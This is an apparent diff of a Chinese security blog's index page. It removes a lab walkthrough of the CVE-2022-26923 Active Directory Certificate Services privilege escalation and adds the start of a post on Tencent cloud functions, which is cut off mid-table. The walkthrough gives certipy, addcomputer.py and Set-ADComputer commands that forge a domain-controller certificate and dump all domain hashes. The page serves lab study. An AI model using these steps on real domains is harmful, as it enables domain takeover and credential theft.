@@ -242,158 +242,6 @@
             
 
   
-    <article id="post-CVE-2022-26923域权限提升" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-  <div class="article-entry" itemprop="articleBody">
-    
-    <p>-–<br>title: Linux日志总结<br>date: 2021-08-12<br>tags: [‘总结’,’日志’]<br>copyright: true<br>-–</p>
-<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h2><p>选择一台winserver2016搭建域控服务，这里是winserver2016。选择Active Directory<br>域服务，其他默认即可。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608935.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608936.png" alt="图形用户界面 描述已自动生成"></p>
-<p>安装完成之后，提升为域控制器，开始配置域控。</p>
-<p>添加新林rangenet.cn，其他默认，然后一步步到安装完成。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608937.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608938.png"></p>
-<h2 id="ADCS搭建"><a href="#ADCS搭建" class="headerlink" title="ADCS搭建"></a>ADCS搭建</h2><p>下面正式开始安装ADCS服务，只需要注意下面截图的内容，其他都是默认。</p>
-<p>服务器管理器–&gt;添加角色和功能向导–&gt;勾选服务器角色–&gt;Active Director 证书服务</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608939.png" alt="图形用户界面, 文本, 应用程序 描述已自动生成"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608940.png" alt="图形用户界面, 应用程序 描述已自动生成"></p>
-<p>开始安装</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608941.png"></p>
-<p>配置ADCS服务，只需要注意下面截图的内容，其他都是默认。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608942.png" alt="图形用户界面 描述已自动生成"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608943.png" alt="图形用户界面, 应用程序 描述已自动生成"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608944.png" alt="图形用户界面, 文本, 应用程序, 电子邮件 描述已自动生成"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608945.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608946.png" alt="图形用户界面, 应用程序 描述已自动生成"></p>
-<h2 id="新建低权限AD用户"><a href="#新建低权限AD用户" class="headerlink" title="新建低权限AD用户"></a>新建低权限AD用户</h2><p>创建低权限AD用户Zhangfei：ZFpassword@123</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608947.png" alt="图形用户界面, 文本, 应用程序, 电子邮件 描述已自动生成"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608948.png" alt="图形用户界面, 文本, 应用程序, 电子邮件 描述已自动生成"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608949.png" alt="图形用户界面, 文本, 应用程序, 电子邮件 描述已自动生成"></p>
-<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/ly4k/Certipy">https://github.com/ly4k/Certipy</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/CravateRouge/bloodyAD">https://github.com/CravateRouge/bloodyAD</a></p>
-<h1 id="测试复现"><a href="#测试复现" class="headerlink" title="测试复现"></a>测试复现</h1><h2 id="配置-DNS"><a href="#配置-DNS" class="headerlink" title="配置 DNS"></a>配置 DNS</h2><p>修改kali的&#x2F;etc&#x2F;hosts文件并添加以下条目：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608950.png" alt="图形用户界面, 文本 描述已自动生成"></p>
-<h2 id="域内定位CA机器"><a href="#域内定位CA机器" class="headerlink" title="域内定位CA机器"></a>域内定位CA机器</h2><p>在域内机器上执行，为了方便这里在域控中执行</p>
-<p>certutil -config - -ping</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608951.png" alt="图形用户界面, 应用程序 描述已自动生成"></p>
-<h2 id="测试证书生成"><a href="#测试证书生成" class="headerlink" title="测试证书生成"></a>测试证书生成</h2><p>首先使用用户证书模板为我们的低权限AD用户 (Username&#x3D;zhangfei<br>Password&#x3D;ZFpassword@123) 生成证书：</p>
-<p>certipy req ‘rangenet.cn&#x2F;zhangfei:ZFpassword@123@dc.rangenet.cn’ -ca<br>RANGENET-DC-CA -template User</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608952.png" alt="文本 描述已自动生成"></p>
-<p>验证此证书是否有效</p>
-<p>certipy auth -pfx zhangfei.pfx</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608953.png" alt="文本 描述已自动生成"></p>
-<h2 id="创建机器账户到域"><a href="#创建机器账户到域" class="headerlink" title="创建机器账户到域"></a>创建机器账户到域</h2><p>我们需要向域中添加一台新计算机以生成机器证书。我们不必将物理计算机添加到网络中。我们可以使用Impacket的addcomputer.py脚本让它看起来像我们正在添加一台新计算机：</p>
-<p>addcomputer.py ‘rangenet.cn&#x2F;zhangfei:ZFpassword@123’ -method LDAPS<br>-computer-name ‘zhangfeiPC’ -computer-pass ‘ZFpassword@123’</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608954.png" alt="文本 描述已自动生成"></p>
-<p>参数说明：</p>
-<ul>
-<li><p><strong>Rangenet.cn&#x2F;zhangfei:ZFpassword@123</strong> 有效的 AD 凭据才能添加新计算机。</p>
-</li>
-<li><p><strong>Method</strong> 身份验证方法。LDAPS 将与域控制器上的 LDAP 服务交互。</p>
-</li>
-<li><p><strong>computer-name</strong> 计算机的名称,可以随便起。</p>
-</li>
-<li><p><strong>computer-pass</strong> 与我计算机的机器帐户关联的密码。也可以随便起。</p>
-</li>
-</ul>
-<h2 id="请求机器证书"><a href="#请求机器证书" class="headerlink" title="请求机器证书"></a>请求机器证书</h2><p>们创建的新计算机生成一个证书。要使用该计算机的机器帐户，您需要在名称末尾添加一个“$”：</p>
-<p>certipy req ‘rangenet.cn&#x2F;zhangfeiPC$:ZFpassword@123@dc.rangenet.cn’ -ca<br>RANGENET-DC-CA -template Machine</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608955.png" alt="文本 描述已自动生成"></p>
-<p>Certipy验证证书是否有效,获取到哈希，证明有效：</p>
-<p>certipy auth -pfx zhangfeipc.pfx</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608956.png" alt="文本 描述已自动生成"></p>
-<h2 id="更新-DNS-主机名和-SPN-属性"><a href="#更新-DNS-主机名和-SPN-属性" class="headerlink" title="更新 DNS 主机名和 SPN 属性"></a>更新 DNS 主机名和 SPN 属性</h2><p>使用Get-ADCompute命令查看AD对象中DNS主机名和SPN：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608957.png" alt="图形用户界面, 文本, 应用程序 描述已自动生成"></p>
-<p>首先删除我们当前的 SPN 属性：</p>
-<p>Set-ADComputer zhangfeiPC -ServicePrincipalName @{}</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608958.png"></p>
-<p>使用Set-ADComputer cmdlet将DNS主机名属性更新为DC的属性</p>
-<p>Set-ADComputer zhangfeiPC -DnsHostName DC.rangenet.cn</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608959.png"></p>
-<p>验证是否进行了更改,可以看到已经成功更改DNSHostName为<strong>dc.rangenet.cn</strong>：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608960.png" alt="图形用户界面, 应用程序 描述已自动生成"></p>
-<h2 id="伪造恶意证书"><a href="#伪造恶意证书" class="headerlink" title="伪造恶意证书"></a>伪造恶意证书</h2><p>再次运行Certipy的相同命令来重新生成机器证书，可以看到DNS Host<br>Name已经变成了dc.rangenet.cn：</p>
-<p>certipy req ‘rangenet.cn&#x2F;zhangfeiPC$:ZFpassword@123@dc.rangenet.cn’ -ca<br>RANGENET-DC-CA -template Machine</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608961.png" alt="文本 描述已自动生成"></p>
-<p>再次验证证书是否有效，成功获取到哈希：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608963.png" alt="文本 描述已自动生成"></p>
-<h2 id="转储所有用户哈希"><a href="#转储所有用户哈希" class="headerlink" title="转储所有用户哈希"></a>转储所有用户哈希</h2><p>这里使用impacket的secretsdump.py来dump哈希</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608964.png" alt="文本 描述已自动生成"></p>
-<h1 id="攻击复现"><a href="#攻击复现" class="headerlink" title="攻击复现"></a>攻击复现</h1><h2 id="配置-DNS-1"><a href="#配置-DNS-1" class="headerlink" title="配置 DNS"></a>配置 DNS</h2><p>修改kali的&#x2F;etc&#x2F;hosts文件并添加以下条目：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608950.png" alt="图形用户界面, 文本 描述已自动生成"></p>
-<h2 id="域内定位CA机器-1"><a href="#域内定位CA机器-1" class="headerlink" title="域内定位CA机器"></a>域内定位CA机器</h2><p>在域内机器上执行，为了方便这里在域控中执行</p>
-<p>certutil -config - -ping</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608951.png" alt="图形用户界面, 应用程序 描述已自动生成"></p>
-<h2 id="测试证书生成-1"><a href="#测试证书生成-1" class="headerlink" title="测试证书生成"></a>测试证书生成</h2><p>首先使用用户证书模板为我们的低权限AD用户 (Username&#x3D;zhangfei<br>Password&#x3D;ZFpassword@123) 生成证书：</p>
-<p>certipy req ‘rangenet.cn&#x2F;zhangfei:ZFpassword@123@dc.rangenet.cn’ -ca<br>RANGENET-DC-CA -template User</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608952.png" alt="文本 描述已自动生成"></p>
-<p>验证此证书是否有效</p>
-<p>certipy auth -pfx zhangfei.pfx</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608953.png" alt="文本 描述已自动生成"></p>
-<h2 id="创建机器账户到域-1"><a href="#创建机器账户到域-1" class="headerlink" title="创建机器账户到域"></a>创建机器账户到域</h2><p>使用bloodyAD工具来创建机器账户。</p>
-<p>查看ms-DS-MachineAccountQuota属性，如果ms-DS-MachineAccountQuota&gt;0就可以创建机器帐户</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608965.png" alt="图形用户界面, 文本 中度可信度描述已自动生成"></p>
-<p>在LDAP中创建一个机器帐户</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608966.png"></p>
-<h2 id="更新机器帐户的DNS-HostName"><a href="#更新机器帐户的DNS-HostName" class="headerlink" title="更新机器帐户的DNS HostName"></a>更新机器帐户的DNS HostName</h2><p>将机器帐户的DNS Host Name改为域控的DC.rangenet.cn</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608967.png" alt="文本, 日程表 描述已自动生成"></p>
-<p>查看属性，是否成功更改了DNS Host Name</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608968.png" alt="文本 描述已自动生成"></p>
-<h2 id="伪造恶意证书-1"><a href="#伪造恶意证书-1" class="headerlink" title="伪造恶意证书"></a>伪造恶意证书</h2><p>运行Certipy来重新生成机器证书，可以看到DNS Host Name已经变成了dc.rangenet.cn：</p>
-<p>certipy req ‘rangenet.cn&#x2F;zhangfeiPC$:ZFpassword@123@dc.rangenet.cn’ -ca<br>RANGENET-DC-CA -template Machine</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608961.png" alt="文本 描述已自动生成"></p>
-<p>再次验证证书是否有效，成功获取到哈希：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608963.png" alt="文本 描述已自动生成"></p>
-<h2 id="转储所有用户哈希-1"><a href="#转储所有用户哈希-1" class="headerlink" title="转储所有用户哈希"></a>转储所有用户哈希</h2><p>这里使用impacket的secretsdump.py来dump哈希</p>
-<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201608964.png" alt="文本 描述已自动生成"></p>
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/CVE-2022-26923%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
     <article id="post-AMSI绕过原理与实践" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -2595,6 +2443,275 @@
     
     <p class="article-more-link">
       <a class="article-more-a" href="/windows%E6%97%A5%E5%BF%97%E6%80%BB%E7%BB%93/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-云函数实现类SSRF" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/%E4%BA%91%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0%E7%B1%BBSSRF/">云函数实现类SSRF</a>
+	
+    </h1>
+  
+
+
+  
+  
+<a href="/%E4%BA%91%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0%E7%B1%BBSSRF/" class="archive-article-date">
+        <time datetime="2021-07-29T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-30</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="云函数的概念与原理"><a href="#云函数的概念与原理" class="headerlink" title="云函数的概念与原理"></a>云函数的概念与原理</h1><h2 id="1-云函数的概念"><a href="#1-云函数的概念" class="headerlink" title="1.云函数的概念"></a>1.云函数的概念</h2><p>云函数（Serverless Cloud Function，SCF）是腾讯云为企业和开发者们提供的无服务器执行环境，帮助您在无需购买和管理服务器的情况下运行代码。您只需使用平台支持的语言编写核心代码并设置代码运行的条件，即可在腾讯云基础设施上弹性、安全地运行代码。SCF 是实时文件处理和数据处理等场景下理想的计算平台。</p>
+<h2 id="2-无服务器的概念"><a href="#2-无服务器的概念" class="headerlink" title="2.无服务器的概念"></a>2.无服务器的概念</h2><p>无服务器（Serverless）不是表示没有服务器，而表示当您在使用 Serverless 时，您无需关心底层资源，也无需登录服务器和优化服务器，只需关注最核心的代码片段，即可跳过复杂的、繁琐的基本工作。核心的代码片段完全由事件或者请求触发，平台根据请求自动平行调整服务资源。Serverless 拥有近乎无限的扩容能力，空闲时，不运行任何资源。代码运行无状态，可以轻易实现快速迭代、极速部署。</p>
+<h2 id="3-函数即服务"><a href="#3-函数即服务" class="headerlink" title="3.函数即服务"></a>3.函数即服务</h2><p>函数即服务提供了一种直接在云上运行无状态的、短暂的、由事件触发的代码的能力。</p>
+<p>函数即服务和传统应用架构不同，函数服务提供的是事件触发式的运行方式，云函数不是始终运行的状态，而是在事件发生时由事件触发运行，并且在一次运行的过程中处理这一次事件。因此在云函数的代码中，仅需考虑针对一个事件的处理流程，而针对大量事件的高并发处理，由平台实现云函数的多实例并发来支持。</p>
+<p>为了实现对高并发的支持，云函数平台提供了自动的弹性伸缩能力，会在有大量请求到来时启动更多实例来处理事件请求，也会在没有事件到来时缩减函数实例甚至到零实例。因此为了匹配自动扩缩能力，需要函数代码使用的是无状态开发方式，即不在云函数的运行内存中保留相关的状态数据并在多次运行时依赖这些状态数据。云函数的状态数据，可以依赖外部的持久存储能力例如云缓存、云数据库、云存储来进行。</p>
+<h2 id="4-触发器和触发源"><a href="#4-触发器和触发源" class="headerlink" title="4.触发器和触发源"></a>4.触发器和触发源</h2><p>任何可以产生事件，触发云函数执行的均可以被称为触发器或触发源。触发器在本身产生事件后，通过将事件传递给云函数来触发函数运行。</p>
+<p>触发器在触发函数时，可以根据自身特点，使用同步或异步方式触发函数。同步方式触发函数时，触发器将等待函数执行完成并获取到函数执行结果；异步方式触发函数时，触发器将仅触发函数而忽略函数执行结果。</p>
+<p>腾讯云云函数在和腾讯云的某些产品或服务对接时，也有自身实现的一些特殊方式，例如推（PUSH）模式和拉（PULL）模式。</p>
+<ul>
+<li>推模式：触发器主动将事件推送至云函数平台并触发函数运行。</li>
+<li>拉模式：云函数平台通过拉取模块，从触发器中拉取到事件并触发云函数运行。</li>
+</ul>
+<h2 id="5-使用流程"><a href="#5-使用流程" class="headerlink" title="5.使用流程"></a>5.使用流程</h2><p>以下为云函数使用流程图及基本步骤简介：</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/WGegAIkTRicibsRwl6ACsqzZDrYKzuLT6P16tLylcdm2ErBGWrxeP0hrWJZIe9j4VC4ySwaibTd4yRkWeibvlASUmA/640?wx_fmt=png" alt="img"></p>
+<ol>
+<li><strong>准备工作</strong>：包含注册腾讯云账号、开通云函数服务、配置基本开发环境等。</li>
+<li><strong>编写函数</strong>：函数是调度与运行的基本单元，编写函数时需遵循函数接口规范。</li>
+<li><strong>本地测试</strong>：可在本地进行代码调试，并将代码部署到云端。</li>
+<li><strong>部署函数（含配置触发器）</strong>：代码部署到云端后，云函数可在配置好条件后执行函数。函数的执行条件被称为触发器，您可以配置定时、API 网关、COS 等多种触发器。</li>
+<li><strong>云端测试</strong>：函数在云端部署完成后，可通过已配置的触发方式测试云函数。</li>
+<li><strong>查看日志</strong>：云函数支持以多种方式查看历史或实时的函数日志。</li>
+<li><strong>查看监控</strong>：可通过查看监控指标，了解函数运行的状况。</li>
+<li><strong>配置告警</strong>：对于线上生产业务非常关键。在配置告警后，当业务出现异常情况，您可以及时收到告警信息。</li>
+</ol>
+<h2 id="6-开发指南"><a href="#6-开发指南" class="headerlink" title="6.开发指南"></a>6.开发指南</h2><h3 id="执行方法"><a href="#执行方法" class="headerlink" title="执行方法"></a>执行方法</h3><p>SCF 平台在调用云函数时，首先会寻找执行方法作为入口，执行用户的代码。此时，用户需以<strong>文件名. 执行方法名</strong>的形式进行设置。例如，用户设置的执行方法为 <code>index.handler</code>，则 SCF 平台会首先寻找代码程序包中的 <code>index</code> 文件，并找到该文件中的 <code>handler</code> 方法开始执行。在编写执行方法时，用户需遵循平台特定的编程模型。如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def method_name(event,context):</span><br><span class="line">  ...</span><br><span class="line">  return some_value</span><br></pre></td></tr></table></figure>
+
+<p>该模型中指定固定的 event 事件数据和 context 环境数据作为入参。在执行方法中，用户需对参数进行处理，并且可任意调用代码中的任何其他方法。</p>
+<h3 id="函数入参"><a href="#函数入参" class="headerlink" title="函数入参"></a>函数入参</h3><p>函数入参，是指函数在被触发调用时所传递给函数的内容。通常情况下，函数入参包括 <strong>event 入参</strong>和 <strong>context 入参</strong>两部分，但根据开发语言和环境的不同，入参个数可能有所不同。</p>
+<h4 id="event-入参"><a href="#event-入参" class="headerlink" title="event 入参"></a>event 入参</h4><h5 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h5><p>参数类型为 <code>dict</code>。将 event 入参传递给执行方法，实现代码与触发函数的事件（event）交互。例如，由于文件上传触发了函数运行，代码可从 event 参数中获取该文件所有信息，包括文件名、下载路径、文件类型、大小等。</p>
+<h5 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h5><p>针对不同的函数情况，event 参数的值有以下区别：</p>
+<ul>
+<li>云服务触发函数时，云服务会将事件以一种平台预定义的、不可更改的格式作为 event 参数传给 SCF 函数，您可以根据此格式编写代码并从 event 参数中获取信息。例如，COS 触发函数时会将 Bucket 及文件的具体信息以 JSON 格式传递给 event 参数。</li>
+<li>云函数被其他应用程序调用时，您可以在调用方和函数代码之间自定义一个 <code>dict</code> 类型的参数。调用方按照定义好的格式传入数据，函数代码按格式获取数据。例如，定义一个 <code>dict</code> 类型的数据结构 <code>&#123;&quot;key&quot;:&quot;XXX&quot;&#125;</code>，当调用方传入数据 <code>&#123;&quot;key&quot;:&quot;abctest&quot;&#125;</code> 时，函数代码可以通过 <code>event[key]</code> 来获得值 <code>abctest</code>。</li>
+</ul>
+<h4 id="context-入参"><a href="#context-入参" class="headerlink" title="context 入参"></a>context 入参</h4><h5 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h5><p>将 context 入参传递给执行方法，代码将通过 context 入参对象，了解到运行环境及当前请求的相关内容。</p>
+<h5 id="使用说明-1"><a href="#使用说明-1" class="headerlink" title="使用说明"></a>使用说明</h5><p>请参考以下 context 入参，了解具体信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  getRemainingTimeInMillis: [Function: getRemainingTimeInMillis],</span><br><span class="line">  memory_limit_in_mb: 128,</span><br><span class="line">  time_limit_in_ms: 3000,</span><br><span class="line">  request_id: &#x27;4ca7089c-3bb0-48cf-bcdb-26d130fed2ae&#x27;,</span><br><span class="line">  environment: &#x27;&#123;&quot;SCF_NAMESPACE&quot;:&quot;default&quot;&#125;&#x27;,</span><br><span class="line">  environ: &#x27;SCF_NAMESPACE=default;SCF_NAMESPACE=default&#x27;,</span><br><span class="line">  function_version: &#x27;$LATEST&#x27;,</span><br><span class="line">  function_name: &#x27;test&#x27;,</span><br><span class="line">  namespace: &#x27;default&#x27;,</span><br><span class="line">  tencentcloud_region: &#x27;ap-chengdu&#x27;,</span><br><span class="line">  tencentcloud_appid: &#x27;1253970226&#x27;,</span><br><span class="line">  tencentcloud_uin: &#x27;3473058547&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中包括了当前调用的执行超时时间，内存限制，以及当次请求 ID。</p>
+<h1 id="WEB-函数的概念与原理"><a href="#WEB-函数的概念与原理" class="headerlink" title="WEB 函数的概念与原理"></a>WEB 函数的概念与原理</h1><h3 id="WEB-函数"><a href="#WEB-函数" class="headerlink" title="WEB 函数"></a>WEB 函数</h3><p>Web 函数（Web Function）是云函数的一种函数类型，区别于事件函数（Event Function）对于事件格式的限制，专注于优化 Web 服务场景，用户可以直接发送 HTTP 请求到 URL 触发函数执行。</p>
+<p>运行原理</p>
+<p>Web 函数运行原理如下图所示：</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/WGegAIkTRicibsRwl6ACsqzZDrYKzuLT6Po5zPxW7fnkvxNB014LogE5D0y8lVeUlwniaY9aicoVnOZcvWP4UAx4xw/640?wx_fmt=png" alt="img"></p>
+<p>用户发送的 HTTP 请求经过 API 网关后，网关侧将原生请求直接透传的同时，在请求头部添加了网关触发函数时需要的函数名、函数地域等内容，并一起传递到函数环境，触发后端函数执行。</p>
+<p>函数环境内，通过内置的 Proxy 实现 Nginx 转发，并去除头部非产品规范的请求信息，将原生 HTTP 请求通过指定端口发送给用户的 Web Server 服务。</p>
+<p>用户的 Web Server 配置好指定的监听端口<code>9000</code>和服务启动文件后部署到云端，通过该端口获取 HTTP 请求并进行处理。</p>
+<h3 id="API-网关触发机制"><a href="#API-网关触发机制" class="headerlink" title="API 网关触发机制"></a>API 网关触发机制</h3><h4 id="API-网关触发器的集成请求事件消息结构"><a href="#API-网关触发器的集成请求事件消息结构" class="headerlink" title="API 网关触发器的集成请求事件消息结构"></a>API 网关触发器的集成请求事件消息结构</h4><p>在 API 网关触发器接收到请求时，会将类似以下 JSON 格式的事件数据发送给绑定的云函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;requestContext&quot;: &#123;</span><br><span class="line">  &quot;serviceId&quot;: &quot;service-f94sy04v&quot;,</span><br><span class="line">  &quot;path&quot;: &quot;/test/&#123;path&#125;&quot;,</span><br><span class="line">  &quot;httpMethod&quot;: &quot;POST&quot;,</span><br><span class="line">  &quot;requestId&quot;: &quot;c6af9ac6-7b61-11e6-9a41-93e8deadbeef&quot;,</span><br><span class="line">  &quot;identity&quot;: &#123;</span><br><span class="line">    &quot;secretId&quot;: &quot;abdcdxxxxxxxsdfs&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;sourceIp&quot;: &quot;10.0.2.14&quot;,</span><br><span class="line">  &quot;stage&quot;: &quot;release&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;headers&quot;: &#123;</span><br><span class="line">  &quot;accept-Language&quot;: &quot;en-US,en,cn&quot;,</span><br><span class="line">  &quot;accept&quot;: &quot;text/html,application/xml,application/json&quot;,</span><br><span class="line">  &quot;host&quot;: &quot;service-3ei3tii4-251000691.ap-guangzhou.apigateway.myqloud.com&quot;,</span><br><span class="line">  &quot;user-Agent&quot;: &quot;User Agent String&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;body&quot;: &quot;&#123;\&quot;test\&quot;:\&quot;body\&quot;&#125;&quot;,</span><br><span class="line">&quot;pathParameters&quot;: &#123;</span><br><span class="line">  &quot;path&quot;: &quot;value&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;queryStringParameters&quot;: &#123;</span><br><span class="line">  &quot;foo&quot;: &quot;bar&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;headerParameters&quot;:&#123;</span><br><span class="line">  &quot;Refer&quot;: &quot;10.0.2.14&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;stageVariables&quot;: &#123;</span><br><span class="line">  &quot;stage&quot;: &quot;release&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;path&quot;: &quot;/test/value&quot;,</span><br><span class="line">&quot;queryString&quot;: &#123;</span><br><span class="line">  &quot;foo&quot; : &quot;bar&quot;,</span><br><span class="line">  &quot;bob&quot; : &quot;alice&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;httpMethod&quot;: &quot;POST&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>数据结构内容详细说明如下：</p>
+<table>
+<thead>
+<tr>
+<th>结构名</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>requestContext</td>
